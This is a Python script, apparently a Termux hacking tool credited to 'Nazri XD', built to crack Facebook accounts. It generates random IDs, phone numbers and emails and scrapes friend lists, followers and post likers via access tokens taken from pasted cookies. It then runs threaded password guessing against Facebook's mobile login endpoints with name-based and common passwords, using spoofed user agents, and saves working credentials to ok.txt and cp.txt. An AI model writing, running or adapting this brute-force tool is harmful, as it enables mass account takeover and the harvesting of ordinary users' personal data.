#coding=utf-8
#coding=utf
author ="Nazri XD"
gh ="XyraaCode"
ver="1.0"
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python hst.py')
logo="""
 _______        _______  ______ _______ _______ _     _
 |______ |      |       |_____/ |_____| |       |____/ 
 |       |_____ |_____  |    \_ |     | |_____  |    \_                                                       
--------------------------------------------------
 Author: Nazri XD
 Github: XyraaCode 
 Version: 1.0
--------------------------------------------------"""
loop = 0
ok = []
cp = []
ua_default = ['Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
'Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; nl) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.668 Mobile Safari/534.8+',
'Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; es) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.480 Mobile Safari/534.8+',
'Mozilla/5.0 (BB10; Touch) AppleWebKit/537.10+ (KHTML, like Gecko) Version/10.1.0.2050 Mobile Safari/537.10+']
ua_nokia = []
ua_android = ['Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T) [FBAN/Orca-Android;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/es_CU;FBBV/14274161;FBCR/null;FBSV/samsung;FBBD/samsung;FBDV/SM-G900F;FBSV/.0.5;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,height=600,width=1024};FB_FW/1;]']
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    join=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ua_nokia.append(join)
    aa='Mozilla/5.0 (BB10; U; en-gb;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='SM-T320NZWAXAR)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.10 (KHTML, like Gecko) Version/10.0.9.773'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.10'
    ujoin2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ua_android.append(ujoin2)
def exit():
    os.sys.exit()
def show(text):
    print(text)
    print(50*'-')
'''try:
    xyz = requests.Session()
    ip_data = xyz.get('http://ip-api.com/json/').text
    ips = json.loads(ip_data)
    ipp = ips['query']
except requests.exceptions.ConnectionError:
    print(' No internet connection ... ')
    exit()'''
def main():
    global ipp
    os.system('clear')
    print(logo)
    #print(' Ip: '+ipp)
    #print(50*'-')
    print(' [1] Random crack')
    print(' [2] File crack')
    print(' [3] Buat file dari publik, pengikut (Login)')
    print(' [4] Buat file acak dengan nama (No-Login)')
    print(' [5] Pilih Id 10008,10007 Str(dari file')
    print(' [6] Ganti Cookie')
    print(' [7] Hapus File Yang Sudah Di Crack')
    print(' [8] Join Grup XTC')
    print(50*'-')
    opt = input(' Masukan Pilihan :')
    if opt =='1':
        random_crack()
    elif opt =='2':
        file_crack()
    elif opt =='3':
        create_file_login()
    elif opt =='4':
        create_file_nologin()
    elif opt =='5':
        sids()
    elif opt =='6':
        os.system('rm -rf fb_cookies.txt')
        login()
    elif opt =='7':
        remove_dub()
    elif opt =='8':
        os.system('xdg-open https://chat.whatsapp.com/BbseVKFwPpxCmL8iNz1k2U')
    else:
        print('\n Choose valid option ... ')
def random_crack():
    os.system('clear')
    print(logo)
    print(' [1] Random uid crack')
    print(' [2] Random number crack')
    print(' [3] Random email crack')
    print(' [4] Random uid with name crack')
    print(50*'-')
    opt = input(' Choose option >>> ')
    if opt =='1':
        os.system('clear && rm -rf .rl.txt')
        print(logo)
        links = ['1000','10000']
        print(' Getting links, wait here ...')
        for xd in range(4999):
            lchoice = random.choice(links)
            if str(len(lchoice)) =='4':
                idss = ''.join(random.choice(string.digits) for _ in range(11))
                open('.rl.txt', 'a').write(lchoice+idss+'\n')
            else:
                idss = ''.join(random.choice(string.digits) for _ in range(10))
                open('.rl.txt','a').write(lchoice+idss+'\n')
        fo = open('.rl.txt','r').read().splitlines()
        with ThreadPool(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(logo)
            print(' Total ids: '+total_ids)
            print(' The process has started')
            print(' Press ctrl z to stop process')
            print(50*'-')
            for user in fo:
                ids = user
                passlist = ['123456','1234567','12345678','123456789']
                crack_submit.submit(asyn,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
        input('\n Press enter to back ')
        main()
    elif opt =='2':
        os.system('clear && rm -rf .rn.txt')
        print(logo)
        print('\033[1;33m Code example: 92301,92302,92303,92305 etc \033[0;97m')
        code = input('\n Put code: ')
        for xd in range(5000):
            no = ''.join(random.choice(string.digits) for _ in range(7))
            open('.rn.txt', 'a').write(code+no+'|'+no+'\n')
        fo = open('.rn.txt','r').read().splitlines()
        with ThreadPool(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(logo)
            print(' Total ids: '+total_ids)
            print(' The process has started')
            print(' Press ctrl z to stop process')
            print(50*'-')
            for user in fo:
                ids,ps = user.split('|')
                passlist = [ps]
                crack_submit.submit(asyn,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
        input('\n Press enter to back ')
        main()
    elif opt =='3':
        os.system('clear && rm -rf .re.txt')
        print(logo)
        print('\033[1;33m first name example: muhammad, noman, tazeem, faizan\033[0;97m')
        first = input('\n Put first name: ')
        print('\n\033[1;33m last name example: hamza, khan, sajjad, rafiq \033[0;97m')
        last = input('\n Put last name: ')
        print('\n\033[1;33m domain example: @gmail.com, @yahoo.com, @yandex.com\033[0;97m')
        domain = input('\n Put domain: ')
        os.system('clear')
        print(logo)
        lists = ['3','4']
        for xd in range(4999):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
        xd_ps=input('  Do you want additional passwords (y/n) ? ')
        fo = open('.re.txt', 'r').read().splitlines()
        with ThreadPool(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(logo)
            print(' Total ids: '+total_ids)
            print(' The process has started')
            print(' Press ctrl z to stop process')
            print(50*'-')
            for user in fo:
                ids,name = user.split('|')
                first_name = name.rsplit(' ')[0]
                try:
                    last_name = name.rsplit(' ')[1]
                except IndexError:
                    last_name = 'Ali'
                fs = first_name.lower()
                ls = last_name.lower()
                if xd_ps =='n':
                    passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name]
                    crack_submit.submit(asyn,ids,passlist,total_ids)
                else:
                    passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'1234',fs+'12345',fs+'786',fs+'12',fs+'1122']
                    crack_submit.submit(asyn,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
        input('\n Press enter to back ')
        main()
def create_file_login():
    try:
        fb = open('fb_cookies.txt', 'r').read()
        fb_token = str(open('access_token.txt', 'r').read())
        fb_cookies = {'cookie':str(fb)}
    except FileNotFoundError:
        login()
    try:
        graph_url = 'https://graph.facebook.com/me?fields=id,name&access_token=%s'%(fb_token)
        xyz = requests.Session()
        r = xyz.get(graph_url,cookies=fb_cookies).text
        data = json.loads(r)
        iid = data['id']
        name = data['name']
    except requests.exceptions.ConnectionError:
        print('  No internet connection ... ')
        exit()
    except KeyError:
        print(' Logged in account has checkpoint, try another account ...')
        os.system('rm -rf fb_cookies.txt access_token.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print(logo)
    print(' Login id: '+iid)
    print(' Login name: '+name)
    print(50*'-')
    print(' [1] Create from public friendlist')
    print(' [2] Create from followers')
    print(' [3] Create from post like')
    print(' [B] Back')
    print(50*'-')
    opt = input(' Choose option >>> ')
    if opt =='1':
        print('\n\n [1] Create auto file')
        print(' [2] Create manual file')
        print(50*'-')
        opt2 = input(' Choose option >>> ')
        if opt2 =='1':
            os.system('clear')
            print(logo)
            try:
                li = int(input(' How many ids do you want to add ? '))
            except:
                li = 1
            #params
            print('\n\033[1;33m Example: /sdcard/filename.txt\033[0;97m')
            fsi = input(' Save file as: ')
            if '/sdcard/' in fsi:
                fs = fsi
            else:
                fs = '/sdcard/'+fsi
            yar = []
            tc = []
            t = 0
            for _ in range(li):
                t +=1
                idt = str(input(' Put id no %s: '%t))
                fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,fb_token)
                xyz = requests.Session()
                fd = xyz.get(fd_url,cookies=fb_cookies).text
                fl = json.loads(fd)
                for i in fl['friends']['data']:
                    uid = i['id']
                    open('.txt', 'a').write(uid+'\n')
                    yar.append(uid)
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(yar)))
            print(50*'-')
            try:
                li2 = int(input(' How many ids do you want to extract ? '))
            except:
                li2 = 1
            print('\n\033[1;33m Link example: 100080,100081,100082,100014,100045 etc \033[0;97m')
            t=0
            for f in range(li):
                t+=1
                sid = input(' %s link start with: '%t)
                os.system('cat .txt | grep "'+sid+'" > .t.txt')
            file_open = open('.t.txt', 'r').read().splitlines()
            tc.append(file_open)
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(tc)))
            print(' The process has started')
            print(' Press ctrl z to stop process')
            print(50*'-')
            for iids in file_open:
                try:
                    relax = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(iids,fb_token)
                    yaad = xyz.get(relax,cookies=fb_cookies).text
                    rd = json.loads(yaad)
                    for fq in rd['friends']['data']:
                        idss = fq['id']
                        fnames = fq['name']
                        open(fs,'a').write(idss+'|'+fnames+'\n')
                        print(' Friendlist from: '+iids)
                        print(' Status: Friendlist extracted')
                        print(' Access token: Live')
                        print(50*'-')
                except KeyError:
                    if 'enrolled' in rd:
                        print(' Friendlist from: '+iids)
                        print(' Status: failed')
                        print(' Access token: expired')
                        print(50*'-')
                        os.system('rm -rf fb_cookies.txt access_token.txt')
                        exit()
                    else:
                        print(' Friendlist from: '+iids)
                        print(' Status: failed, no public friendlist')
                        print(' Access token: Live')
                        print(50*'-')
                except requests.exceptions.ConnectionError:
                    print(' No internet connection ...')
                    break
            print(50*'-')
            print(' The process has completed')
            print(' Total ids extracted: '+str(len(open(fs,'r').read().splitlines())))
            print(' File saved as: '+fs)
            input('\n Press enter to back ')
            main()
        elif opt2 =='2':
            os.system('clear')
            print(logo)
            try:
                li = int(input(' How many ids do you want to add ? '))
            except:
                li = 1
            print('\n\033[1;33mExample: /sdcard/filename.txt\033[0;97m')
            fsi = input(' Save file as: \n')
            if '/sdcard/' in fsi:
                fs = fsi
            else:
                fs = '/sdcard/'+fsi
            tc = []
            t = 0
            for _ in range(li):
                t +=1
                try:
                    idt = input(' Put id no %s: '%t)
                    fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,fb_token)
                    xyz = requests.Session()
                    fd = xyz.get(fd_url,cookies=fb_cookies).text
                    fl = json.loads(fd)
                    for i in fl['friends']['data']:
                        uid = i['id']
                        fnames = i['name']
                        open(fs,'a').write(uid+'|'+fnames+'\n')
                        tc.append(uid)
                except requests.exceptions.ConnectionError:
                    print(' No internet connection ...')
                    break
                except KeyError:
                    if 'enrolled' in fl:
                        print('  Logged in id got checkpoint, try another account ...')
                        os.system('rm -rf fb_cookies.txt access_token.txt')
                        exit()
                    else:
                        print(' No friendlist found ...')
                        break
            print(50*'-')
            print(' Total ids: '+str(len(tc)))
            print(' File saved as: '+fs)
            input('\n Press enter to back ')
            main()
        else:
            print(' Choose valid option ...')
            time.sleep(1)
            create_file_login()
    elif opt =='2':
        os.system('clear')
        print(logo)
        try:
            li = int(input(' How many ids do you want to add ? '))
        except:
            li = 1
        print('\n\033[1;33mExample: /sdcard/filename.txt\033[0;97m')
        fsi = input(' Save file as: \n')
        if '/sdcard/' in fsi:
            fs = fsi
        else:
            fs = '/sdcard/'+fsi
        tc = []
        t = 0
        for _ in range(li):
            t +=1
            try:
                idt = input(' Put id no %s: '%t)
                fd_url = 'https://graph.facebook.com/%s?fields=subscribers.fields(id,name)&access_token=%s'%(idt,fb_token)
                xyz = requests.Session()
                fd = xyz.get(fd_url,cookies=fb_cookies).text
                fl = json.loads(fd)
                for i in fl['subscribers']['data']:
                    uid = i['id']
                    fnames = i['name']
                    open(fs,'a').write(uid+'|'+fnames+'\n')
                    tc.append(uid)
            except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
                break
            except KeyError:
                if 'enrolled' in fl:
                    print('  Logged in id got checkpoint, try another account ...')
                    os.system('rm -rf fb_cookies.txt access_token.txt')
                    exit()
                else:
                    print(' No friendlist found ...')
                    break
        print(50*'-')
        print(' Total ids: '+str(len(tc)))
        print(' File saved as: '+fs)
        input('\n Press enter to back ')
        main()
    elif opt =='3':
        os.system('clear')
        print(logo)
        try:
            li = int(input(' How many posts do you want to add ? '))
        except:
            li = 1
        print('\n\033[1;33mExample: /sdcard/filename.txt\033[0;97m')
        fsi = input(' Save file as: \n')
        if '/sdcard/' in fsi:
            fs = fsi
        else:
            fs = '/sdcard/'+fsi
        tc = []
        t = 0
        for _ in range(li):
            t +=1
            try:
                idt = input(' Put id no %s: '%t)
                fd_url = 'https://graph.facebook.com/%s?fields=reactions.fields(id,name)&access_token=%s'%(idt,fb_token)
                xyz = requests.Session()
                fd = xyz.get(fd_url,cookies=fb_cookies).text
                fl = json.loads(fd)
                for i in fl['reactions']['data']:
                    uid = i['id']
                    fnames = i['name']
                    open(fs,'a').write(uid+'|'+fnames+'\n')
                    tc.append(uid)
            except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
                break
            except KeyError:
                if 'enrolled' in fl:
                    print('  Logged in id got checkpoint, try another account ...')
                    os.system('rm -rf fb_cookies.txt access_token.txt')
                    exit()
                else:
                    print(' No friendlist found ...')
                    break
        print(50*'-')
        print(' Total ids: '+str(len(tc)))
        print(' File saved as: '+fs)
        input('\n Press enter to back ')
        main()
def file_crack():
    global ok
    global cp
    os.system('clear')
    print(logo)
    print(' [1] method 1')
    print(' [2] method 2')
    print(' [3] FB apk login method')
    print(50*'-')
    opt_method = input(' Choose method: ')
    os.system('clear')
    print(logo)
    show(' Use flight mode before using starting crack')
    file = input(' Put file path: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(' No file found on provided path ...')
        time.sleep(1)
        file_crack()
    print('\n [1] First&last name password crack')
    print(' [2] First last digits password crack')
    print(' [3] Firstlast digits password crack')
    print(' [4] All name passwords')
    print(' [5] Choice passwords')
    print(50*'-')
    opt_ps = input(' Choose option >>> ')
    if opt_ps =='1':
        with ThreadPool(max_workers=30) as crack_submit:
            os.system('clear')
            print(logo)
            show(' On Off Mode Pesawat Setiap Akun OK/cp')
            total_ids = str(len(fo))
            print(' Total ids: '+total_ids)
            print(' Sedang Crack!')
            print(' Press ctrl z to stop')
            print(50*'-')
            for user in fo:
                ids,name = user.split('|')
                first_name = name.rsplit(' ')[0]
                try:
                    last_name = name.rsplit(' ')[1]
                except IndexError:
                    last_name = 'palembang'
                fs = first_name.lower()
                ls = last_name.lower()
                passlist = [fs+' '+ls,fs+ls,fs+'1234']
                if opt_method =='1':
                    crack_submit.submit(regular,ids,passlist,total_ids)
                elif opt_method =='2':
                    crack_submit.submit(asyn,ids,passlist,total_ids)
                else:
                    crack_submit.submit(validate,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
        input('\n Press enter to back ')
        main()
    elif opt_ps =='2':
        with ThreadPool(max_workers=30) as crack_submit:
            os.system('clear')
            print(logo)
            show(' On Off Mode Pesawat Setiap Akun OK/cp')
            total_ids = str(len(fo))
            print(' Total ids: '+total_ids)
            print(' Sedang Crack!')
            print(' Press ctrl z to stop')
            print(50*'-')
            for user in fo:
                ids,name = user.split('|')
                first_name = name.rsplit(' ')[0]
                try:
                    last_name = name.rsplit(' ')[1]
                except IndexError:
                    last_name = 'palembang'
                fs = first_name.lower()
                ls = last_name.lower()
                passlist = [fs+'12',fs+'1122',first_name+'123',fs+'1234',first_name+'12345',fs+'786']
                if opt_method =='1':
                    crack_submit.submit(regular,ids,passlist,total_ids)
                elif opt_method =='2':
                    crack_submit.submit(asyn,ids,passlist,total_ids)
                else:
                    crack_submit.submit(validate,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
        input('\n Press enter to back ')
        main()
    elif opt_ps =='3':
        with ThreadPool(max_workers=30) as crack_submit:
            os.system('clear')
            print(logo)
            show(' On Off Mode Pesawat Setiap Akun OK/cp')
            total_ids = str(len(fo))
            print(' Total ids: '+total_ids)
            print(' Sedang Crack!')
            print(' Press ctrl z to stop')
            print(50*'-')
            for user in fo:
                ids,name = user.split('|')
                first_name = name.rsplit(' ')[0]
                try:
                    last_name = name.rsplit(' ')[1]
                except IndexError:
                    last_name = 'palembang'
                fs = first_name.lower()
                ls = last_name.lower()
                passlist = [fs+ls+'12',fs+ls+'123',fs+ls+'1234',fs+ls+'12345',fs+ls+'786',fs+ls+'1']
                if opt_method =='1':
                    crack_submit.submit(regular,ids,passlist,total_ids)
                elif opt_method =='2':
                    crack_submit.submit(asyn,ids,passlist,total_ids)
                else:
                    crack_submit.submit(validate,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
        input('\n Press enter to back ')
        main()
    elif opt_ps =='4':
        with ThreadPool(max_workers=30) as crack_submit:
            os.system('clear')
            print(logo)
            show(' On Off Mode Pesawat Setiap Akun OK/cp')
            total_ids = str(len(fo))
            print(' Total ids: '+total_ids)
            print(' Sedang Crack!')
            print(' Press ctrl z to stop')
            print(50*'-')
            for user in fo:
                ids,name = user.split('|')
                first_name = name.rsplit(' ')[0]
                try:
                    last_name = name.rsplit(' ')[1]
                except IndexError:
                    last_name = 'palembang'
                fs = first_name.lower()
                ls = last_name.lower()
                passlist = [fs+' '+ls,fs+ls,first_name+' '+last_name,fs+'12',fs+'123',fs+'1234',fs+'12345',fs+'786',fs+ls+'12',fs+ls+'123',fs+ls+'1234',fs+ls+'12345',fs+ls+'786']
                if opt_method =='1':
                    crack_submit.submit(regular,ids,passlist,total_ids)
                elif opt_method =='2':
                    crack_submit.submit(asyn,ids,passlist,total_ids)
                else:
                    crack_submit.submit(validate,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
        input('\n Press enter to back ')
        main()
    elif opt_ps =='5':
        with ThreadPool(max_workers=30) as crack_submit:
            os.system('clear')
            print(logo)
            show(' On Off Mode Pesawat Setiap Akun OK/cp')
            print('\033[1;33m\n Password example: 223344,pakistan786,786786,000786\033[0;97m')
            passlist = input(' Passwords: ').split(',')
            total_ids = str(len(fo))
            print(' Total ids: '+total_ids)
            print(' Sedang Crack!')
            print(' Press ctrl z to stop')
            print(50*'-')
            for user in fo:
                ids,name = user.split('|')
                if opt_method =='1':
                    crack_submit.submit(regular,ids,passlist,total_ids)
                elif opt_method =='2':
                    crack_submit.submit(asyn,ids,passlist,total_ids)
                else:
                    crack_submit.submit(validate,ids,passlist,total_ids)
        print(50*'-')
        print(' The process has completed')
        print(' Total OK/CP: '+str(len(ok))+'/'+str(len(cp)))
        input('\n Press enter to back ')
        main()
def regular(ids,passlist,total_ids):
    global ua_android,loop,ok,cp
    sys.stdout.write('\r   [%s/%s]  OK:- %s  CP:- %s \r'%(loop,total_ids,len(ok),len(cp)));sys.stdout.flush()
    try:
        for pas in passlist:
            xyz = requests.Session()
            header = ({
                'authority':'https://free.facebook.com',
                'method':'GET',
                'path':'/login/device-based/password/?uid=%s&flow=login_no_pin&refsrc=deprecated&_rdr'%(ids),
                'scheme':'https',
                'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-encoding':'gzip, deflate, br,utf-8',
                'accept-language':'en-US,en;q=0.9',
                'cache-control':'max-age=0',
                'pragma':'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id, akamai-x-get-client-ip, x-akamai-cpi-trace, x-akamai-a2-trace,akamai-x-im-trace, akamai-x-feo-trace,akamai-x-tapioca-trace,x-akamai-a2-trace,akamai-x-ro-trace, akamai-x-get-brotli-status',
                'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile':'?1',
                'sec-ch-ua-platform':'"Android"',
                'sec-fetch-dust':'document',
                'sec-fetch-mode':'navigate',
                'sec-fetch-site':'none',
                'sec-fetch-user':'?1',
                'upgrade-insecure-requests':'1',
                'user-agent':random.choice(ua_android)
            })
            url = 'https://free.facebook.com/login/device-based/password/?uid=%s&flow=login_no_pin&refsrc=deprecated&_rdr'%(ids)
            raw = xyz.get(url).text
            payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(raw)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(raw)).group(1),
            "uid":ids,
            "flow":"login_no_pin",
            "next":"https://free.facebook.com/login/save-device/",
            "pass":pas}
            post_request = xyz.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=payload,headers=header).text
            cookies = xyz.cookies.get_dict().keys()
            if 'c_user' in cookies:
                print('\033[1;32m [CP] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                print('\033[1;31m [OK] '+ids+' | '+pas+'\033[0;97m')
                cp.append(ids)
                open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
def asyn(ids,passlist,total_ids):
    global ua_nokia,loop,ok,cp
    sys.stdout.write('\r   [%s/%s]  OK:- %s  CP:- %s \r'%(loop,total_ids,len(ok),len(cp)));sys.stdout.flush()
    try:
        for pas in passlist:
            xyz = requests.Session()
            header = ({
                'authority':'https://free.facebook.com',
                'method':'GET',
                'path':'/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',
                'scheme':'https',
                'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-encoding':'*',
                'accept-language':'en-US,en;q=0.9',
                'cache-control':'max-age=0',
                'pragma':'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id, akamai-x-get-client-ip, x-akamai-cpi-trace, x-akamai-a2-trace,akamai-x-im-trace, akamai-x-feo-trace,akamai-x-tapioca-trace,x-akamai-a2-trace,akamai-x-ro-trace, akamai-x-get-brotli-status',
                'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile':'?1',
                'sec-ch-ua-platform':'"Android"',
                'sec-fetch-dust':'document',
                'sec-fetch-mode':'navigate',
                'sec-fetch-site':'none',
                'sec-fetch-user':'?1',
                'upgrade-insecure-requests':'1',
                'user-agent':'Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T) [FBAN/Orca-Android;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/es_CU;FBBV/14274161;FBCR/null;FBSV/samsung;FBBD/samsung;FBDV/SM-G900F;FBSV/.0.5;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,height=600,width=1024};FB_FW/1;]'
            })
            url = 'https://free.facebook.com/'
            raw = xyz.get(url).text
            payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(raw)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(raw)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(raw)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(raw)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas}
            post_request = xyz.post('https://free.facebook.com//login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=payload,headers=header).text
            #open('regular_login.html','w').write(post_request)
            cookies = xyz.cookies.get_dict().keys()
            #print(cookies)
            if 'c_user' in cookies:
                print('\033[1;32m [Successful-HST] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                print('\033[1;31m [Checkpoint-HST] '+ids+' | '+pas+'\033[0;97m')
                cp.append(ids)
                open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
def login():
    os.system('clear')
    print(logo)
    print('\n\033[1;33m If you donot know how to get cookies, see option in main menu\033[0;97m')
    cookies = input('\n Put cookies here: ')
    try:
        print('\n Validating cookies ... ')
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
        find_token = re.search("(EAAG\w+)", data.text)
        open("access_token.txt", "w").write(find_token.group(1))
        open("fb_cookies.txt","w").write(cookies)
        print(' Logged in successfully ...')
        time.sleep(1)
        os.system('python hst.py')
    except KeyError:
        print('\n Inavlid cookies, try another cookies')
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input(' Input file name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print('\n\033[0;97m  File not found on provided path, try again ...\033[0;97m')
    limit = int(input(' How many links do you want to separate? '))
    print('\n\033[1;33m Example: /sdcard/filename.txt\033[0;97m')
    new_save = input(' Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(50*'-')
    print(' Links grabbed successfully')
    print(' Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print(' New file saved as: '+new_save)
    print(50*'-')
    input(' Press enter to back ')
def remove_dub():
    os.system('clear')
    print(logo)
    print(' Dublicate lines remover ...')
    print(50*'-')
    user_file = input(' Put file path: ')
    try:
        open(user_file,'r').read()
        print('\n\033[1;33m Example: /sdcard/filename.txt\033[0;97m')
        save_file = input(' Save new file as: ')
        os.system('touch '+save_file)
        os.system('sort -r '+user_file+' | uniq > '+save_file)
        print(50*'-')
        print(' Dublicate lines has been removed from file')
        print(' Result file saved as: ')
        print(50*'-')
    except FileNotFoundError:
        print('\n\033[0;97m File not found on provided path, try again ...\033[0;97m')
main()
